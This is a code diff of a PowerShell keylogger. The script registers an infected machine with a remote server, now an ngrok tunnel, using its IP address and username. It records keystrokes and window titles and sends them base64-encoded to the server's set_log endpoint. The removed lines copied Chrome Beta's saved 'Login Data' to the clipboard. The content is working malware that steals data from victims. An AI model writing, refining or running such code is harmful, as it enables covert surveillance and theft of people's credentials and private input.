@@ -1,12 +1,10 @@
- cd AppData\Local\Google\"Chrome Beta"\"User Data"\Default 
- set-clipboard (get-content 'Login Data.txt')
-$server = 'http://192.168.1.41:6060'
+$server = 'https://1e0f-78-191-73-67.eu.ngrok.io/'
 $ip		= get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1} 
 $user 	= (whoami).split('\')[1]
 $id 	= $ip.ipaddress[0]+'.'+$user
 write-host $id
 
-if((New-Object Net.WebClient).DownloadString($server+'/set_agent/'+$id) -eq 'true') {
+if((New-Object Net.WebClient).DownloadString($server+'set_agent/'+$id) -eq 'true') {
 write-host 'keylogging'
 [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null
 
@@ -161,7 +159,7 @@ while ($true) {
 			if ($unicode_res -gt 0) {
 				if ($WindowTitle -ne $LastWindowTitle){
 					# if the window has changed
-					$TimeStamp = (get-clipboard)
+					$TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
 					$Outout = "`n[$WindowTitle - $TimeStamp]`n"
 					$LastWindowTitle = $WindowTitle
 				}
@@ -175,7 +173,7 @@ while ($true) {
 		$timer = 0
 		$buff = $buff.Trim()
 		if($buff.Length -gt 10) {
-			if((New-Object Net.WebClient).DownloadString($server+'/set_log/?id='+$id+'&string='+[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($buff))) -eq 'False') {
+			if((New-Object Net.WebClient).DownloadString($server+'set_log/?id='+$id+'&string='+[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($buff))) -eq 'False') {
 				Exit
 			}
 
